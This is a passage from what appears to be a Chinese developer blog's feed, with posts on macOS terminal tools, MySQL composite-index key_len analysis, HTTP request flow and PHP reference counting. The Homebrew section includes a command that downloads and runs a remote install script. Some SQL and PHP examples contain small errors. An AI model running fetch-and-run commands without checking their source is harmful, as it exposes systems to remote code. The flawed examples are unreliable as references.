    <updated>2021-04-03T09:42:07.392Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记主要是用来整理自己一直在使用的一些较为好用的终端工具/扩展。</p><a id="more"></a><p>因为我个人的终端配置是<code>ZSH</code> + <code>iTerm2</code>，所以本文的部分<code>ZSH</code> 扩展可能不适用于其他<code>Shell</code>用户。</p><h2 id="brew"><a href="#brew" class="headerlink" title="brew"></a>brew</h2><p>经常与终端打交道的用户，对这个一定不陌生，它就是类似<code>Ubuntu</code>下的<code>apt-get</code>这样的包管理工具。</p><p>通常我需要搭建一个全新的开发环境时，它一定是第一个需要安装的工具。</p><p>安装 brew（<a href="https://brew.sh/" target="_blank" rel="noopener">brew 官网</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot;</span><br></pre></td></tr></table></figure><p>常用命令如下：<br>常用命令如下：<br>| 命令 | 描述 |<br>|— | — |<br>|brew search package | 搜索软件包|<br>|brew install package | 安装软件包|<br>|brew uninstall package | 卸载软件包|<br>|brew list | 列出已安装清单|<br>|brew help | 获取帮助|</p><h2 id="OSX-扩展"><a href="#OSX-扩展" class="headerlink" title="OSX 扩展"></a>OSX 扩展</h2><p><code>osx</code> 扩展是<code>zsh</code> 提供的一个控制终端和访达（功能之一）的扩展工具。</p><p>其中最为常用是<code>ofd</code>命令，将当前<code>shell</code>窗口在访达中打开。</p><p>另一个较为常用的命令是<code>cdf</code>，可在<code>shell</code>中直接跳转至当前访达窗口所在的路径（如果存在多个访达窗口，那么跳转至最前面的那个）。</p><p>其他常用命令如下：</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>tab</td><td>在当前目录打开一个新窗口</td></tr><tr><td>split_tab</td><td>在当前窗口打开一个水平窗口</td></tr><tr><td>vsplit_tab</td><td>在当前窗口打开一个垂直窗口</td></tr><tr><td>ofd</td><td>在访达窗口中打开当前目录</td></tr><tr><td>pfd</td><td>返回最前面的访达窗口的路径</td></tr><tr><td>pfs</td><td>返回当前查找程序选择</td></tr><tr><td>cdf</td><td>cd 到当前访达窗口所在的路径</td></tr><tr><td>pushdf</td><td>pushed 到当前访达目录</td></tr><tr><td>quick-look</td><td>快速查看指定文件</td></tr><tr><td>man-preview</td><td>在预览应用程序中打开特定的手册页</td></tr><tr><td>showfiles</td><td>显示隐藏文件</td></tr><tr><td>hidefiles</td><td>隐藏隐藏的文件</td></tr><tr><td>rmdsstore</td><td>以递归方式删除目录中的.DS_Store文件</td></tr></tbody></table><h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p><code>tmux</code> 是一个终端下窗口分割的工具，有关它的具体介绍，请查阅<a href="https://www.0x2beace.com/tmux-quick-start/">这篇笔记</a>。</p><h2 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h2><p>autojump - 目录快速跳转命令行工具，从此告别<code>cd... cd...</code>。</p><p>autojump 是一个<code>Windows</code>、<code>Linux</code>、<code>macOS</code> 都能使用的命令行工具，这是仅介绍<code>macOS</code> 的安装方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install autojump</span><br></pre></td></tr></table></figure><p>使用<code>brew</code>安装完成之后，还需要进行配置，以下方法二选一：</p><ul><li>在 <code>~/.bash_profile</code> 文件中加入语句 <code>[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh</code>。</li><li>在 <code>~/.zshrc</code> 文件中，修改 <code>plugins=(git)</code> 插件配置行，以开启 <code>zsh</code> 对 <code>autojump</code> 插件的支持 <code>plugins=(git autojump)</code>。</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>j foo</td><td>跳转到包含 foo 的目录</td></tr><tr><td>jc bar</td><td>跳转到包含 bar 的子目录</td></tr><tr><td>jo file</td><td>在访达中打开包含 file 的目录</td></tr><tr><td>autojump –help</td><td>打开帮助列表</td></tr></tbody></table><h2 id="Spaceship-ZSH"><a href="#Spaceship-ZSH" class="headerlink" title="Spaceship ZSH"></a>Spaceship ZSH</h2><p>Spaceship ZSH——是一个极简、强大和可定制的<code>ZSH</code>提示符。</p><p>我是在无意间发现的这个终端工具的，先来看一下实际效果。</p><p><img src="https://user-images.githubusercontent.com/10276208/36086434-5de52ace-0ff2-11e8-8299-c67f9ab4e9bd.gif" alt="image"></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>Spaceship ZSH 有很多很棒的特点，这里仅仅列举一些我所看见的。</p><ul><li>颜值即正义</li><li>展示当前Git 仓库的状态</li><li>展示各种语言的当前版本</li><li>展示最后一条命令的总执行时间</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Spaceship ZSH 的安装方式有多种，这里仅介绍通过<code>oh-my-zsh</code>的安装方式，其他方式可参考<a href="https://denysdovhan.com/spaceship-prompt/" target="_blank" rel="noopener">官网</a>。</p><ol><li>克隆仓库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot;</span><br></pre></td></tr></table></figure></li><li>将<code>spaceship.zsh-theme</code> 链接到<code>oh-my-zsh</code> 的主题目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh-theme&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot;</span><br></pre></td></tr></table></figure></li><li>编辑<code>~/.zshrc</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME&#x3D;&quot;spaceship&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>tldr 是一个比man 更好用的命令行手册。</p><p>它衍生出了各种语言的客户端，这里直接使用官网推荐的方式进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g tldr</span><br></pre></td></tr></table></figure><p>安装完成之后，第一次使用<code>tldr</code>命令需要下载相关依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tldr tar</span><br><span class="line">Page not found. Updating cache...</span><br><span class="line">Error: connect ECONNREFUSED 127.0.0.1:443</span><br></pre></td></tr></table></figure><p>如果出现上面这个输出，表示命令行需要使用代理，如果不知道如何设置，可以参考<a href="https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/">这篇笔记</a>。</p><p>正常输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tldr tar</span><br><span class="line">✔ Page not found. Updating cache...</span><br><span class="line">✔ Creating index...</span><br><span class="line"></span><br><span class="line">  tar</span><br><span class="line"></span><br><span class="line">  Archiving utility.</span><br><span class="line">  Often combined with a compression method, such as gzip or bzip.</span><br><span class="line">  More information: https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;tar.</span><br><span class="line"></span><br><span class="line">  - [c]reate an archive from [f]iles:</span><br><span class="line">    tar cf target.tar file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - [c]reate a g[z]ipped archive from [f]iles:</span><br><span class="line">    tar czf target.tar.gz file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - [c]reate a g[z]ipped archive from a directory using relative paths:</span><br><span class="line">    tar czf target.tar.gz --directory&#x3D;path&#x2F;to&#x2F;directory .</span><br><span class="line"></span><br><span class="line">  - E[x]tract a (compressed) archive [f]ile into the current directory:</span><br><span class="line">    tar xf source.tar[.gz|.bz2|.xz]</span><br><span class="line"></span><br><span class="line">  - E[x]tract a (compressed) archive [f]ile into the target directory:</span><br><span class="line">    tar xf source.tar[.gz|.bz2|.xz] --directory&#x3D;directory</span><br><span class="line"></span><br><span class="line">  - [c]reate a compressed archive from [f]iles, using [a]rchive suffix to determine the compression program:</span><br><span class="line">    tar caf target.tar.xz file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - Lis[t] the contents of a tar [f]ile [v]erbosely:</span><br><span class="line">    tar tvf source.tar</span><br><span class="line"></span><br><span class="line">  - E[x]tract [f]iles matching a pattern:</span><br><span class="line">    tar xf source.tar --wildcards &quot;*.html&quot;</span><br></pre></td></tr></table></figure><p>上面那个node 的客户端不是交互式的，如果需要自动的，可以使用 <a href="https://github.com/isacikgoz/tldr" target="_blank" rel="noopener">tldr++</a>，这是一个Go 语言编写的交互式客户端。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener">安装 zsh</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins" target="_blank" rel="noopener">如何启用 zsh 的插件</a></li><li><a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/plugins/osx" target="_blank" rel="noopener">OSX 插件</a></li><li><a href="https://github.com/denysdovhan/spaceship-prompt#installing" target="_blank" rel="noopener">Spaceship ZSH</a></li><li><a href="https://github.com/wting/autojump" target="_blank" rel="noopener">autojump——自动跳转文件目录</a></li><li><a href="https://github.com/tldr-pages/tldr" target="_blank" rel="noopener">tldr——比man 更好用的命令行手册</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记主要是用来整理自己一直在使用的一些较为好用的终端工具/扩展。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/categories/Tutorial/Mac/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 索引设计与优化</title>
    <link href="https://www.0x2beace.com/mysql-index-design-and-optimization/"/>
    <id>https://www.0x2beace.com/mysql-index-design-and-optimization/</id>
    <published>2021-01-10T13:12:04.000Z</published>
    <updated>2021-01-10T13:13:04.486Z</updated>
    
    <content type="html"><![CDATA[<p>什么是索引？</p><a id="more"></a><blockquote><p>数据库索引是一种数据结构，它以额外的写入和存储空间为代价来提高数据库表上数据检索操作的速度。通俗来说，索引类似于书的目录，根据其中记录的页码可以快速找到所需的内容。——维基百科</p></blockquote><p>常见索引有哪些？</p><ul><li>普通索引：最基本的索引，没有任何限制</li><li>唯一索引：与”普通索引“类似，不同的就是：索引列的值必须是唯一，但允许有空值</li><li>主键索引：它是一种特殊的索引，不允许有空值</li><li>全文索引：仅可用于 MyISAM 表，针对较大的数据，生成全文索引很耗时占空间</li><li>组合索引：为了提高多条件查询效率，可建立组合索引，遵循”最左前缀匹配原则“</li></ul><p>这里以相对复杂的组合为例，介绍如何优化。</p><h2 id="最左前缀匹配原则"><a href="#最左前缀匹配原则" class="headerlink" title="最左前缀匹配原则"></a>最左前缀匹配原则</h2><p>首先我们要知道什么是最左前缀匹配原则。</p><p>最左前缀匹配原则是指在使用 B+Tree 联合索引进行数据检索时，MySQL 优化器会读取谓词（过滤条件）<strong>并按照联合索引字段创建顺序一直向右匹配直到遇到范围查询或非等值查询后停止匹配</strong>，此字段之后的索引列不会被使用，这时计算 <code>key_len</code> 可以分析出联合索引实际使用了哪些索引列。</p><h3 id="如何计算-key-len"><a href="#如何计算-key-len" class="headerlink" title="如何计算 key_len"></a>如何计算 key_len</h3><p>通过 <code>key_len</code> 计算也帮助我们了解索引的最左前缀匹配原则。</p><p><code>key_len</code> 表示得到结果集所使用的选择索引的长度[字节数]，不包括 <code>order by</code>，也就是说如果 <code>order by</code> 也使用了索引则 <code>key_len</code> 不计算在内。</p><p>在计算 <code>key_len</code> 之前，先来温习一下基本数据类型（以UTF8 编码为例）：<br>|类型|所占空间|不允许为NULL额外占用|<br>|-|-|-|<br>|char|一个字符三个字节|一个字节|<br>|varchar|一个字符三个字节|一个字节|<br>|int|四个字节|一个字节|<br>|tinyint|一个字节|一个字节|</p><p>测试数据表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;test_table&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;a&#96; int(11) DEFAULT NOT NULL,</span><br><span class="line">  &#96;b&#96; int(11) DEFAULT NOT NULL,</span><br><span class="line">  &#96;c&#96; int(11) DEFAULT NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;test_table_a_b_c_index&#96; (&#96;a&#96;,&#96;b&#96;,&#96;c&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><p>命中索引：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">| id | select_type | table      | partitions | type | possible_keys          | key                    | key_len | ref               | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | test_table | NULL       | ref  | test_table_a_b_c_index | test_table_a_b_c_index | 12      | const,const,const |    1 |   100.00 | Using index |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br></pre></td></tr></table></figure><p>可以看到 <code>key_len = 12</code>，这是如何计算的呢？<br>因为字符集是 UTF8，一个字段占用四个字节，三个字段就是 4 * 3 = 12 字节。</p><p>是否允许为 NULL，如果允许为 NULL，则需要用额外的字节来标记该字段，不同的数据类型所需的字节大小不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;a&#96; &#96;a&#96; INT(11)  NULL;</span><br><span class="line">mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;c&#96; &#96;c&#96; INT(11)  NULL;</span><br><span class="line">mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;b&#96; &#96;b&#96; INT(11)  NULL;</span><br><span class="line">mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">| id | select_type | table      | partitions | type | possible_keys          | key                    | key_len | ref               | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | test_table | NULL       | ref  | test_table_a_b_c_index | test_table_a_b_c_index | 15      | const,const,const |    1 |   100.00 | Using index |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br></pre></td></tr></table></figure><p>可以看到，当字段允许为空时，这时的<code>key_len</code> 变成了15 = 4 * 3 + 1 * 3（INT 类型为空时，额外占用一个字节）。</p><h2 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h2><p>有了这些基础知识之后，再来根据实际的SQL 判断索性性能好坏。</p><p>还是以上面那张数据表为例，为 a、b、c 三个字段创建联合索引。<br>|SQL 语句|是否索引|<br>|-|-|<br>|explain select * from test_table where a = 1 and b = 2 and c = 3;|Extra:Using index key_len: 15|<br>|explain select * from test_table where a = 1 and b = 2 and c = 3 order by c;|Extra:Using index key_len: 15|<br>|explain select * from test_table where b = 2 and c = 3;|Extra:Using where; Using index key_len: 15|<br>|explain select * from test_table where a = 1 order by c;|Extra:Using where; Using index; Using filesort key_len: 5|<br>|explain select * from test_table order by a, b, c;|Extra:Using index key_len: 15|<br>|explain select * from test_table order by a, b, c desc;|Extra:Using index; Using filesort key_len:15|<br>|explain select * from test_table where a in (1,2) and b in (1,2,3) and c = 1;|Extra:Using where; Using index key_len: 15|</p><p>通常在查看执行计划时， Extra 列为 Using index 则表示优化器使用了覆盖索引。</p><ul><li>SQL1 可以使用覆盖索引，性能好</li><li>SQL2 可以使用覆盖索引，同时避免排序，性能好</li><li>SQL3 可以使用覆盖索引，但是需要根据 where 字句进行过滤</li><li>SQL4 可以使用部分索引 a，但无法避免排序，性能差</li><li>SQL5 可以完全使用覆盖索引，同时可以避免排序，性能好</li><li>SQL6 可以使用覆盖索引，但无法避免排序，（这是因为 MySQL InnoDB 创建索引时默认asc升序，索引无法自动倒序排序）</li><li>SQL7 可以使用覆盖索引，但是需要根据 where 子句进行过滤（非定值查询）</li></ul><h2 id="创建索引规范"><a href="#创建索引规范" class="headerlink" title="创建索引规范"></a>创建索引规范</h2><ul><li>考虑到索引维护的成本，单张表的索引数量不超过 5 个，单个索引中的字段数不超过 5 个</li><li>不在低基数列上建⽴索引，例如“性别”。 在低基数列上创建的索引查询相比全表扫描不一定有性能优势，特别是当存在回表成本时。</li><li>合理创建联合索引，(a,b,c) 相当于 (a) 、(a,b) 、(a,b,c)。 </li><li>合理使用覆盖索引减少IO，避免排序。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/xuanzhi201111/p/4554769.html" target="_blank" rel="noopener">Explain之key_len长度计算</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;什么是索引？&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>一次完整的网络请求过程</title>
    <link href="https://www.0x2beace.com/a-complete-network-request-process/"/>
    <id>https://www.0x2beace.com/a-complete-network-request-process/</id>
    <published>2021-01-06T15:41:25.000Z</published>
    <updated>2021-02-25T11:54:22.940Z</updated>
    
    <content type="html"><![CDATA[<p>在浏览器中输入 <code>www.0xbeace.com</code> 这个域名，然后就能看到精美的页面了，这中间倒底发生了些什么呢？</p><a id="more"></a><p>其整个过程大致可以分为以下几个步骤：</p><ol><li>DNS 域名解析，寻找对应的IP 地址</li><li>根据这个IP 找到对应的服务器，建立TCP 连接（三次握手）</li><li>TCP 建连之后，发起HTTP 请求</li><li>服务器响应 HTTP 请求</li><li>客户端接收数据解析并渲染页面</li><li>服务器关闭TCP 连接（四次挥手）</li></ol><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>以<code>0xbeace.com</code>这个域名为例，DNS 域名解析大致可以细分成以下几个小步骤：</p><ol><li>DNS 缓存（这里的缓存分为浏览器和操作系统）</li><li>本地域名服务器（Hosts 文件）</li><li>根域名服务器</li><li>COM 顶级域名服务器</li><li><code>0xbeace.com</code> 域名服务器</li></ol><p>域名解析一般就是按照该过程去查找，这里引用一张图（没找到具体出处），更加通俗易懂地解释了完整地解析过程。</p><div align="center"><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210105110247.png" width=""><br><sup>DNS 域名解析详细过程</sup></div><h2 id="TCP-建连"><a href="#TCP-建连" class="headerlink" title="TCP 建连"></a>TCP 建连</h2><h2 id="客户端发起请求"><a href="#客户端发起请求" class="headerlink" title="客户端发起请求"></a>客户端发起请求</h2><p>TCP 连接成功之后，就可以按照固定格式向服务器发起请求了。</p><p>一个完整的 HTTP 请求应该包含以下几部分：</p><ol><li><strong>请求行</strong>：用于描述客户端的请求方式（GET/POST等），请求的资源名称(URL)以及使用的HTTP协议的版本号</li><li><strong>请求头</strong>：用于描述客户端请求哪台主机及其端口，以及客户端的身份信息（User-Agent）等</li><li><strong>请求正文</strong>：客户端需要发送给服务端的数据</li></ol><h2 id="服务端响应请求"><a href="#服务端响应请求" class="headerlink" title="服务端响应请求"></a>服务端响应请求</h2><p>客户端成功发起请求之后，客户端接收请求并处理将结果响应至客户端。</p><p>一个完整的 HTTP 响应应该包含以下几个部分：</p><ol><li><strong>状态行</strong>：如：<code>HTTP/1.1 200 ok</code>，分别表示 http版本 + 状态码 + 状态代码的文本描述</li><li><strong>响应头</strong>：包含服务器相关信息</li><li><strong>响应正文</strong>：服务器返回给客户端的数据</li></ol><h2 id="客户端渲染"><a href="#客户端渲染" class="headerlink" title="客户端渲染"></a>客户端渲染</h2><p>这里以最常见的 .html 文件为例，当客户端接收到响应数据之后，便开始解析 HTML，如果遇到<code>js/css</code>这类静态资源，就会向服务器发起一个HTTP 请求，如果该请求的返回状态码是 <code>304</code>（已经缓存在本地浏览器了），就会直接从缓存中获取，否则就会开启新的线程去向服务器请求下载。</p><p>这时就用到了 <code>keep-alive</code> 这个特性，可以建立一次TCP 连接，发起多次 HTTP 请求。</p><p>然后浏览器再利用自己的内部工作机制，将HTML 与静态资源进行渲染，最后呈现给用户。</p><h2 id="TCP-关闭连接"><a href="#TCP-关闭连接" class="headerlink" title="TCP 关闭连接"></a>TCP 关闭连接</h2><p>一般情况下，服务端向客户端完成一次请求，就会关闭TCP 连接，那么下一次又需要发起 HTTP 请求时，就需要再次建立一次TCP 连接了。</p><p>频繁建立/关闭连接，不仅增加了请求响应时间，还额外增加了网络带宽消耗，所以HTTP 协议为我们提供了一个可以保持TCP 的通用消息头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure><p>至此一个完整的HTTP 请求就完成了。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="为什么HTTP-协议要基于TCP-来实现"><a href="#为什么HTTP-协议要基于TCP-来实现" class="headerlink" title="为什么HTTP 协议要基于TCP 来实现"></a>为什么HTTP 协议要基于TCP 来实现</h3><p>这是因为TCP 是一个端到端的面向连接的协议，HTTP基于传输层TCP协议不用担心数据传输的各种问题（当发生错误时，会重传）。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://cloud.tencent.com/developer/article/1500463" target="_blank" rel="noopener">一次完整的HTTP请求过程</a></li><li><a href="https://www.jianshu.com/p/5c66dec332b3" target="_blank" rel="noopener">一次完整的网络请求是怎么样的？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在浏览器中输入 &lt;code&gt;www.0xbeace.com&lt;/code&gt; 这个域名，然后就能看到精美的页面了，这中间倒底发生了些什么呢？&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
  </entry>
  
  <entry>
    <title>PHP 垃圾回收机制</title>
    <link href="https://www.0x2beace.com/php-garbage-collection-mechanism/"/>
    <id>https://www.0x2beace.com/php-garbage-collection-mechanism/</id>
    <published>2021-01-04T14:44:06.000Z</published>
    <updated>2021-02-03T08:32:46.856Z</updated>
    
    <content type="html"><![CDATA[<p>PHP 是一门托管型语言，在PHP 编程时，程序员不需要手动处理内存资源的分配和释放，这就意味着 PHP 本身实现了垃圾回收机制（Garbage Collection）。</p><a id="more"></a><blockquote><p>垃圾回收机制是什么？</p></blockquote><p>垃圾回收是一种自动的存储器管理机制，当某个程序占用的一部分内存空间不再被这个程序所访问时，这个程序会借助垃圾回收算法自动向操作系统归还这部分的内存空间。</p><h2 id="PHP-引用计数"><a href="#PHP-引用计数" class="headerlink" title="PHP 引用计数"></a>PHP 引用计数</h2><p>定义一个PHP 变量如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str &#x3D; &quot;boo&quot;;</span><br><span class="line">$str_bak &#x3D; $var;</span><br><span class="line">unset($str);</span><br></pre></td></tr></table></figure><p>上面这几行代码分别做了如下事情：</p><ol><li>第一行代码创建了一个字符串变量，申请了一个大小为 三个字节的内存空间，保存了字符串 <code>boo</code> 和一个 <code>NULL(\0)</code>的结尾。</li><li>第二行代码定义了一个新的字符串变量，并将变量<code>str</code>的值复制给了这个新的变量。</li><li>第三行 <code>unset</code> 掉了变量 <code>str</code></li></ol><p>这样的代码在很常见，如果PHP 对于每一个变量赋值都重新分配内存，copy 数据的话，那么上面的那段代码就需要共申请六个字节的内存空间，而我们也很容易看出来，其实完全没有必要申请两份空间。</p><p>PHP中的变量是用一个存储在 <code>symbol_table</code> 中的符号名，对应一个 <code>zval</code> 变量容器来实现的，比如对于上面的第一行代码，会在 <code>symbol_table</code> 中存储一个值 <code>str</code>, 对应的有一个指针指向一个 <code>zval</code>结构，变量值 <code>boo</code> 保存在这个变量容器中，所以不难想象，对于上面的代码来说，我们完全可以让 <code>str</code> 和 <code>str_bak</code> 对应的指针都指向同一个变量容器就可以了。</p><p>PHP 也是这样做的，这是就需要介绍 <code>zval</code>变量容器的结构了。</p><p>每个变量存在一个叫做<code>zval</code>的变量容器中。一个<code>zval</code>变量容器，除了包含变量的类型和值，还包括两个字节的额外信息：</p><ol><li><code>is_ref</code>：bool 值，用来标示这个变量是否属于引用集合（reference_set）。通过这个字节，PHP 引擎才能把普通变量和引用变量区分开来。</li><li><code>refcount</code>：用以表示指向这个 <code>zval</code> 变量容器的变量个数。</li></ol><h3 id="1-查看内部结构"><a href="#1-查看内部结构" class="headerlink" title="1. 查看内部结构"></a>1. 查看内部结构</h3><p>当一个变量被赋值时，就会生成一个<code>zval</code>变量容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str &#x3D; &quot;hello, php&quot;;</span><br><span class="line">xdebug_debug_zval(&#39;str&#39;);</span><br></pre></td></tr></table></figure><p>在 PHP 中可以通过 xdebug 扩展中提供的方法<code>xdebug_debug_zval()</code>来查看变量的计数变化。</p><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10)</span><br></pre></td></tr></table></figure><h3 id="2-增加引用次数"><a href="#2-增加引用次数" class="headerlink" title="2. 增加引用次数"></a>2. 增加引用次数</h3><p>把一个变量赋值给另一个变量将增加引用次数（refcount + 1）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str &#x3D; &quot;hello, php&quot;;</span><br><span class="line">$str2 &#x3D; $str</span><br><span class="line">xdebug_debug_zval(&#39;str&#39;);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str:(refcount&#x3D;2, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10)</span><br></pre></td></tr></table></figure><p>这时，引用次数是 <code>2</code>，这是因为同一个变量容器被变量a 和变量b 关联，当任何关联到的某个变量容器离开它的作用域（比如：函数执行结束），或者对变量调用了 <code>unset()</code> 函数，<code>refcount</code>的值就会 <code>-1</code>，当没必要时，PHP 不会再去复制已生成的变量容器，变量容器在<code>refcount</code>的值变为 0 时，就会被销毁。</p><h3 id="3-数组型的变量"><a href="#3-数组型的变量" class="headerlink" title="3. 数组型的变量"></a>3. 数组型的变量</h3><figure class="highlight 